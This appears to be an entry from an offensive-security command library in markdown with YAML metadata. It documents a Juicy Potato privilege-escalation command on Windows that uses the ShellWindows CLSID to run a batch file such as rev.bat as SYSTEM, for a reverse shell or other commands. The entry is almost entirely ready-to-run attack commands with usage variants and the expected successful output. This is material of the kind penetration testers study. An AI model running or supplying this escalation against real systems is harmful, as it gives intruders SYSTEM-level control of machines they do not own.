---
type: command
executor: cmd
data: >-
  JuicyPotato.exe -l 1340 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c
  {e60687f7-01a1-40aa-86ac-db1cbf673334}
tags:
  - privilege-escalation
  - batch-shell
  - windows
platforms:
  - Windows
verified: true
validated: true
---

# juicy-potato-rev-bat-clsid-e60687f7

## Command

```cmd
JuicyPotato.exe -l 1340 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

## Description

Uses Juicy Potato with CLSID {e60687f7-...} (ShellWindows) to escalate and run a batch file for reverse shell or commands under SYSTEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l 1340 | Local port for pipe | Yes |
| -p $_PROCESS_PATH | Path to batch file (e.g., rev.bat) | Yes |
| -t $_TOKEN_TYPE | Token type (* for default) | Yes |
| -c {e60687f7-...} | CLSID for ShellWindows | Yes |

## Examples

### Basic Usage

```cmd
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

### Advanced Usage

With additional arguments if needed:

```cmd
JuicyPotato.exe -l 1340 -p rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} -a "param1 param2"
```

## Expected Output

Testing {e60687f7-...} 1340
...
[+] authresult 0
{e60687f7-...};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

The batch file executes as SYSTEM.

## Related

- [[procedures/Abusing-Golden-Privileges-with-Juicy-Potato]]
- [[tools/Juicy-Potato]]
